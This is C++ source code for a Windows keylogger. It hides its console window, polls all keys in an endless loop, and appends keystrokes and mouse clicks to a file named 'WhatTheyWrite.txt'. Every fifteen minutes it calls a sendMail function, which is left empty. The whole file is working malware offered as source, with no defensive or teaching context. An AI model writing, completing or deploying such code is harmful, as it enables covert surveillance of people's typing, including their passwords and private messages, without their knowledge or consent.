#include<iostream>
#include<string>
#include<fstream>
#include<Windows.h>
#include<time.h>


using namespace std;

bool checkSpecialKey(int key);
string specialKeyConverter(int key);
void writeInFile(string wtt);
void sendMail();

void main()
{
	HWND hdwnd = GetConsoleWindow();
	ShowWindow(hdwnd, SW_HIDE);
	string keyPressed;
	time_t timeNow = time(0);

	while (1)
	{
		for (int key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				if (checkSpecialKey(key))
				{
					keyPressed = specialKeyConverter(key);
					writeInFile(keyPressed);
				}

				else
				{
					if (GetKeyState(VK_CAPITAL)) {}
					else
						keyPressed = tolower((char)key);

					writeInFile(keyPressed);
				}
			}
		}

		if (time(0)>=timeNow+900)
		{
			sendMail();
			timeNow = time(0);
		}
	}
}


bool checkSpecialKey(int key)
{
	switch (key)
	{
	case VK_LBUTTON:
	case VK_RBUTTON:
	case VK_BACK:
	case VK_TAB:
	case VK_RETURN:
	case VK_SHIFT:
	case VK_CONTROL:
	case VK_MENU:
	case VK_CAPITAL:
	case VK_ESCAPE:
	case VK_SPACE:
		return true;

	default:
		return false;;
	}
}


string specialKeyConverter(int key)
{
	string converted = " ";

	if (GetKeyState(VK_LBUTTON) && 0x8000 != 0)
		converted = "[LMC]";

	if (GetKeyState(VK_RBUTTON) && 0x8000 != 0)
		converted = "[RMC]";

	switch (key)
	{
	case VK_BACK:
		converted = "[Backspace]";
		break;

	case VK_TAB:
		converted = "[TAB]";
		break;

	case VK_RETURN:
		converted = "\n";
		break;

	case VK_SHIFT:
		converted = "[SHIFT]";
		break;

	case VK_CONTROL:
		converted = "[CTRL]";
		break;

	case VK_MENU:
		converted = "[ALT]";
		break;

	case VK_CAPITAL:
		converted = "[CAPSLOCK]";
		break;

	case VK_ESCAPE:
		converted = "[ESC]";
		break;

	case VK_SPACE:
		converted = "  ";
		break;

	default:
		return "";
	}

	return converted;
}

void writeInFile(string wtt)
{
	ofstream write("WhatTheyWrite.txt",ios::app);
	write << wtt;
	write.close();
}

void sendMail()
{
	
}
